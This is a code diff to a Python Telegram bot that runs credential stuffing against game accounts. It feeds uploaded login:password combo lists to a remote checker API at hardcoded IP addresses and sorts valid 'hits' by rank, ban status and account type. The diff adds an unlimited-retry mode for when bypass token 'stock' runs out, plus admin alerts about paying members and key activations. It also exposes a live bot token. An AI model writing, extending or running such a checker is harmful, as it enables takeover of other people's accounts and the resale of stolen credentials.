@@ -34,7 +34,7 @@ TOKEN    = "8909716394:AAE0MT6AIgm_i4ILQqeBwMIomz9ZOlW_uOI"
 ADMIN_ID = 8595414927
 CHANNEL  = "nixzllls"
 
-API_URL      = "http://144.91.112.169:4040/check"
+API_URL      = "http://5.189.140.181:4040/check"
 AKAMAI_API   = "http://5.189.140.181:3030/api/status"
 CN31_API     = "http://5.189.140.181:8080/stats"
 
@@ -129,6 +129,23 @@ chat_id_store = {}
 BOT_STATUS        = "on"
 BOT_STATUS_LOCK   = threading.Lock()
 
+UNLI_RETRY      = False
+UNLI_RETRY_LOCK = threading.Lock()
+
+_TOKEN_ERR_PHRASES = (
+    "failed to fetch",
+    "fetch cn3",
+    "fetch akamai",
+    "token",
+    "no token",
+    "unavailable",
+    "server error",
+    "queue empty",
+    "pool empty",
+    "stock",
+    "no stock",
+)
+
 def get_bot_status():
     with BOT_STATUS_LOCK:
         return BOT_STATUS
@@ -137,6 +154,15 @@ def set_bot_status(status):
     global BOT_STATUS
     with BOT_STATUS_LOCK:
         BOT_STATUS = status
+
+def get_unli_retry():
+    with UNLI_RETRY_LOCK:
+        return UNLI_RETRY
+
+def set_unli_retry(val):
+    global UNLI_RETRY
+    with UNLI_RETRY_LOCK:
+        UNLI_RETRY = val
 
 free_check_queue   = queue.Queue()
 free_queue_lock    = threading.Lock()
@@ -1578,79 +1604,94 @@ def check_single_thread(login, password, uid, chat_id, context, st_obj, app_loop
     if cancel_flag.get(uid):
         return
 
-    try:
-        r    = requests.get(API_URL, params={"login": login, "password": password}, timeout=60, verify=False)
-        data = r.json()
-    except requests.exceptions.Timeout:
-        with lock:
-            st_obj["errors"]  += 1
-            st_obj["checked"] += 1
-        return
-    except Exception:
-        with lock:
-            st_obj["errors"]  += 1
-            st_obj["checked"] += 1
-        return
+    retry_enabled = get_unli_retry()
 
-    if cancel_flag.get(uid):
-        return
+    while not cancel_flag.get(uid):
+        try:
+            r    = requests.get(API_URL, params={"login": login, "password": password}, timeout=60, verify=False)
+            data = r.json()
+        except requests.exceptions.Timeout:
+            with lock:
+                st_obj["errors"]  += 1
+                st_obj["checked"] += 1
+            return
+        except Exception:
+            if retry_enabled:
+                time.sleep(2)
+                continue
+            with lock:
+                st_obj["errors"]  += 1
+                st_obj["checked"] += 1
+            return
 
-    status = data.get("status", "error")
+        if cancel_flag.get(uid):
+            return
 
-    if status == "valid":
-        banned = data.get("banned", False)
-        ban_expired, _ = parse_ban_expired(data.get("ban_reason", ""), data.get("ban_expires", ""))
+        status  = data.get("status", "error")
+        message = data.get("message", "") or ""
 
-        gd                = data.get("game_data", {})
-        current_rank_game = gd.get("current_rank", "")
-        display_rank      = current_rank_game if current_rank_game else data.get("rank", "?")
-        collector_tier    = gd.get("collector_tier", "N/A")
-        region            = data.get("region", "?")
-        name              = data.get("name", "?")
-        level             = data.get("level", "?")
-        v2l_status        = gd.get("v2l_status", "") or ""
-        v2l_active        = str(v2l_status).strip().upper() not in ("", "N/A", "NONE", "FALSE", "0", "NO", "NOT ELIGIBLE", "INELIGIBLE")
-        is_actually_banned = banned and not ban_expired
-        is_email = is_email_account(login)
+        if status == "error" and retry_enabled:
+            msg_lower = message.lower()
+            if any(p in msg_lower for p in _TOKEN_ERR_PHRASES):
+                time.sleep(1)
+                continue
 
-        with lock:
-            st_obj["valid"]   += 1
-            st_obj["checked"] += 1
-            if is_actually_banned:
-                st_obj["banned"] += 1
-            if not is_actually_banned:
-                if v2l_active:
-                    st_obj["v2l_on"]  = st_obj.get("v2l_on", 0) + 1
+        if status == "valid":
+            banned = data.get("banned", False)
+            ban_expired, _ = parse_ban_expired(data.get("ban_reason", ""), data.get("ban_expires", ""))
+
+            gd                = data.get("game_data", {})
+            current_rank_game = gd.get("current_rank", "")
+            display_rank      = current_rank_game if current_rank_game else data.get("rank", "?")
+            collector_tier    = gd.get("collector_tier", "N/A")
+            region            = data.get("region", "?")
+            name              = data.get("name", "?")
+            level             = data.get("level", "?")
+            v2l_status        = gd.get("v2l_status", "") or ""
+            v2l_active        = str(v2l_status).strip().upper() not in ("", "N/A", "NONE", "FALSE", "0", "NO", "NOT ELIGIBLE", "INELIGIBLE")
+            is_actually_banned = banned and not ban_expired
+            is_email = is_email_account(login)
+
+            with lock:
+                st_obj["valid"]   += 1
+                st_obj["checked"] += 1
+                if is_actually_banned:
+                    st_obj["banned"] += 1
+                if not is_actually_banned:
+                    if v2l_active:
+                        st_obj["v2l_on"]  = st_obj.get("v2l_on", 0) + 1
+                    else:
+                        st_obj["v2l_off"] = st_obj.get("v2l_off", 0) + 1
+                if is_email:
+                    st_obj["empass"]   = st_obj.get("empass", 0) + 1
                 else:
-                    st_obj["v2l_off"] = st_obj.get("v2l_off", 0) + 1
-            if is_email:
-                st_obj["empass"]   = st_obj.get("empass", 0) + 1
-            else:
-                st_obj["userpass"] = st_obj.get("userpass", 0) + 1
+                    st_obj["userpass"] = st_obj.get("userpass", 0) + 1
 
-        update_stats_after_hit(st_obj, display_rank, collector_tier, region, name, level)
+            update_stats_after_hit(st_obj, display_rank, collector_tier, region, name, level)
 
-        plain_text = format_hit_plain(login, password, data)
-        with lock:
-            if is_actually_banned:
-                st_obj.setdefault("ban_lines", []).append(plain_text)
-            elif v2l_active:
-                st_obj.setdefault("v2l_on_lines",  []).append(plain_text)
-                st_obj.setdefault("valid_lines",    []).append(plain_text)
-            else:
-                st_obj.setdefault("v2l_off_lines", []).append(plain_text)
+            plain_text = format_hit_plain(login, password, data)
+            with lock:
+                if is_actually_banned:
+                    st_obj.setdefault("ban_lines", []).append(plain_text)
+                elif v2l_active:
+                    st_obj.setdefault("v2l_on_lines",  []).append(plain_text)
+                    st_obj.setdefault("valid_lines",    []).append(plain_text)
+                else:
+                    st_obj.setdefault("v2l_off_lines", []).append(plain_text)
                 st_obj.setdefault("valid_lines",   []).append(plain_text)
-        time.sleep(0.05)
+            time.sleep(0.05)
 
-    elif status == "invalid":
-        with lock:
-            st_obj["invalid"] += 1
-            st_obj["checked"] += 1
+        elif status == "invalid":
+            with lock:
+                st_obj["invalid"] += 1
+                st_obj["checked"] += 1
 
-    else:
-        with lock:
-            st_obj["errors"]  += 1
-            st_obj["checked"] += 1
+        else:
+            with lock:
+                st_obj["errors"]  += 1
+                st_obj["checked"] += 1
+
+        return
 
 
 def _update_live_stats(chat_id, context, st_obj, app_loop):
@@ -1871,8 +1912,66 @@ def process_next_free_queue(context, app_loop):
         daemon=True
     ).start()
 
+async def notify_admin_new_member(bot, uid, uname, fname, user_data_dict):
+    sep  = "━━━━━━━━━━━━━━━━━━━━━━━━"
+    sep2 = "────────────────────────"
+    prem      = is_premium(user_data_dict)
+    access    = "PREMIUM" if prem else "FREE"
+    exp       = user_data_dict.get("premium_expires")
+    exp_str   = "N/A"
+    if prem and exp:
+        try:
+            exp_str = datetime.fromisoformat(exp).strftime("%Y-%m-%d %H:%M")
+        except Exception:
+            exp_str = exp
+    joined    = user_data_dict.get("joined", "")
+    joined_str = "N/A"
+    if joined:
+        try:
+            joined_str = datetime.fromisoformat(joined).strftime("%Y-%m-%d %H:%M:%S")
+        except Exception:
+            joined_str = joined
+    ref_count = user_data_dict.get("referral_count", 0)
+    ref_pts   = user_data_dict.get("referral_points", 0)
+    referred  = user_data_dict.get("referred_by", None)
+    total_chk = user_data_dict.get("total_checked", 0)
+    now_str   = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    uname_display = f"@{uname}" if uname else "no username"
+    text = (
+        f"{sep}\n"
+        f"  <b>NEW MEMBER JOINED BOT</b>\n"
+        f"{sep}\n\n"
+        f"  <b>User ID:</b> <code>{uid}</code>\n"
+        f"  <b>Username:</b> {uname_display}\n"
+        f"  <b>Name:</b> {fname or 'N/A'}\n\n"
+        f"{sep2}\n"
+        f"  <b>MEMBERSHIP</b>\n"
+        f"{sep2}\n\n"
+        f"  <b>Access:</b> {access}\n"
+        f"  <b>Joined Bot:</b> {joined_str}\n"
+        f"  <b>Notification Time:</b> {now_str}\n"
+    )
+    if prem:
+        text += f"  <b>Premium Expires:</b> {exp_str}\n"
+    text += (
+        f"\n{sep2}\n"
+        f"  <b>STATS</b>\n"
+        f"{sep2}\n\n"
+        f"  <b>Total Checked:</b> {total_chk:,}\n"
+        f"  <b>Referrals Invited:</b> {ref_count}\n"
+        f"  <b>Referral Points:</b> {ref_pts}\n"
+        f"  <b>Referred By:</b> {'Yes (UID ' + str(referred) + ')' if referred else 'No'}\n"
+        f"\n{sep}"
+    )
+    try:
+        await bot.send_message(chat_id=ADMIN_ID, text=text, parse_mode="HTML")
+    except Exception:
+        pass
+
 async def key_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    uid = update.effective_user.id
+    uid   = update.effective_user.id
+    uname = update.effective_user.username
+    fname = update.effective_user.first_name
     if not context.args:
         await update.message.reply_text(
             "Usage: /key YOUR-KEY-HERE\nExample: /key NIXSZ-ABCD1234",
@@ -1883,8 +1982,48 @@ async def key_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     with data_lock:
         db  = get_db()
         ok, msg = redeem_key(db, uid, key_str)
+        if ok:
+            user_snap = dict(get_user(db, uid))
+            key_snap  = dict(db["keys"].get(key_str, {}))
         save_db(db)
     await update.message.reply_text(msg, reply_markup=back_keyboard())
+    if ok:
+        sep  = "━━━━━━━━━━━━━━━━━━━━━━━━"
+        sep2 = "────────────────────────"
+        key_type   = key_snap.get("key_type", "full")
+        type_label = {"ban": "Ban Check Only", "semi": "Full Info Only", "full": "Full Access"}.get(key_type, "Full Access")
+        dur_val    = key_snap.get("duration_value", "?")
+        dur_unit   = key_snap.get("duration_unit", "?")
+        exp        = user_snap.get("premium_expires", "")
+        exp_str    = "N/A"
+        if exp:
+            try:
+                exp_str = datetime.fromisoformat(exp).strftime("%Y-%m-%d %H:%M")
+            except Exception:
+                exp_str = exp
+        uname_display = f"@{uname}" if uname else "no username"
+        now_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        admin_text = (
+            f"{sep}\n"
+            f"  <b>KEY ACTIVATED</b>\n"
+            f"{sep}\n\n"
+            f"  <b>User ID:</b> <code>{uid}</code>\n"
+            f"  <b>Username:</b> {uname_display}\n"
+            f"  <b>Name:</b> {fname or 'N/A'}\n\n"
+            f"{sep2}\n"
+            f"  <b>KEY INFO</b>\n"
+            f"{sep2}\n\n"
+            f"  <b>Key:</b> <code>{key_str}</code>\n"
+            f"  <b>Type:</b> {type_label}\n"
+            f"  <b>Duration:</b> {dur_val} {dur_unit}\n"
+            f"  <b>Expires:</b> {exp_str}\n"
+            f"  <b>Activated At:</b> {now_str}\n"
+            f"\n{sep}"
+        )
+        try:
+            await context.bot.send_message(chat_id=ADMIN_ID, text=admin_text, parse_mode="HTML")
+        except Exception:
+            pass
     return ConversationHandler.END
 
 async def is_member(bot, uid):
@@ -2019,6 +2158,10 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
                         parse_mode="HTML"
                     ))
         save_db(db)
+        is_brand_new = user.get("total_checked", 0) == 0 and len(db["users"]) > 0
+
+    if is_brand_new and uid != ADMIN_ID:
+        asyncio.ensure_future(notify_admin_new_member(context.bot, uid, uname, fname, user))
 
     prem       = is_premium(user)
     access_tag = " PREMIUM" if prem else " FREE"
@@ -2511,24 +2654,40 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 f"Original: {len(raw_combos):,}\n"
                 f"Already checked (sent back): {removed_count:,}\n"
                 f"Fresh accounts to check: <b>{len(combos_to_check):,}</b>\n\n"
-                f"Now, how do you want to receive the hits?",
+                f"━━━━━━━━━━━━━━━━━━━━━━━━\n"
+                f"  <b>UNLIMITED RETRY</b>\n"
+                f"━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
+                f"<b>ENABLE</b> — If Akamai or CN31 has no stock, the checker keeps retrying that account until it gets a result. No accounts are skipped or counted as errors due to token issues.\n"
+                f"<b>Advantage:</b> Less errors, every account gets a fair check.\n"
+                f"<b>Disadvantage:</b> If stock is gone, checker stalls and never finishes until stock comes back.\n\n"
+                f"<b>DISABLE</b> — Checker continues even with no stock. Accounts with no token available are counted as errors and skipped.\n"
+                f"<b>Advantage:</b> Checking always finishes, never stalls.\n"
+                f"<b>Disadvantage:</b> Accounts may show error instead of valid/invalid if stock is low.\n\n"
+                f"<i>Cannot retry timeout errors regardless of mode.</i>",
                 parse_mode="HTML",
                 reply_markup=InlineKeyboardMarkup([
-                    [InlineKeyboardButton("One by one", callback_data="send_hits_onebyone")],
-                    [InlineKeyboardButton("As .txt file", callback_data="send_hits_txt")],
-                    [InlineKeyboardButton("Both", callback_data="send_hits_both")],
+                    [InlineKeyboardButton("✅ ENABLE RETRY", callback_data="retry_enable")],
+                    [InlineKeyboardButton("❌ DISABLE RETRY", callback_data="retry_disable")],
                 ])
             )
         else:
             combos_to_check = raw_combos
             await query.edit_message_text(
                 f"<b>[ {len(combos_to_check):,} ACCOUNTS LOADED ]</b>\n{sep2}\n\n"
-                f"How do you want to receive the hits?",
+                f"━━━━━━━━━━━━━━━━━━━━━━━━\n"
+                f"  <b>UNLIMITED RETRY</b>\n"
+                f"━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
+                f"<b>ENABLE</b> — If Akamai or CN31 has no stock, the checker keeps retrying that account until it gets a result. No accounts are skipped or counted as errors due to token issues.\n"
+                f"<b>Advantage:</b> Less errors, every account gets a fair check.\n"
+                f"<b>Disadvantage:</b> If stock is gone, checker stalls and never finishes until stock comes back.\n\n"
+                f"<b>DISABLE</b> — Checker continues even with no stock. Accounts with no token available are counted as errors and skipped.\n"
+                f"<b>Advantage:</b> Checking always finishes, never stalls.\n"
+                f"<b>Disadvantage:</b> Accounts may show error instead of valid/invalid if stock is low.\n\n"
+                f"<i>Cannot retry timeout errors regardless of mode.</i>",
                 parse_mode="HTML",
                 reply_markup=InlineKeyboardMarkup([
-                    [InlineKeyboardButton("One by one", callback_data="send_hits_onebyone")],
-                    [InlineKeyboardButton("As .txt file", callback_data="send_hits_txt")],
-                    [InlineKeyboardButton("Both", callback_data="send_hits_both")],
+                    [InlineKeyboardButton("✅ ENABLE RETRY", callback_data="retry_enable")],
+                    [InlineKeyboardButton("❌ DISABLE RETRY", callback_data="retry_disable")],
                 ])
             )
 
@@ -2536,6 +2695,26 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         context.user_data["pending_total"]   = len(combos_to_check)
         context.user_data["pending_prem"]    = prem2
         context.user_data["pending_chat_id"] = chat_id2
+        context.user_data["awaiting_retry_mode"] = True
+        return AWAITING_CHECK_FILE
+
+    if data in ("retry_enable", "retry_disable"):
+        set_unli_retry(data == "retry_enable")
+        sep2 = "────────────────────────"
+        retry_label = "ENABLED" if data == "retry_enable" else "DISABLED"
+        combos_count = len(context.user_data.get("pending_combos", []))
+        await query.edit_message_text(
+            f"<b>[ {combos_count:,} ACCOUNTS LOADED ]</b>\n{sep2}\n\n"
+            f"Retry: <b>{retry_label}</b>\n\n"
+            f"How do you want to receive the hits?",
+            parse_mode="HTML",
+            reply_markup=InlineKeyboardMarkup([
+                [InlineKeyboardButton("One by one", callback_data="send_hits_onebyone")],
+                [InlineKeyboardButton("As .txt file", callback_data="send_hits_txt")],
+                [InlineKeyboardButton("Both", callback_data="send_hits_both")],
+            ])
+        )
+        context.user_data.pop("awaiting_retry_mode", None)
         return AWAITING_CHECK_FILE
 
     if data in ("send_hits_onebyone", "send_hits_txt", "send_hits_both"):
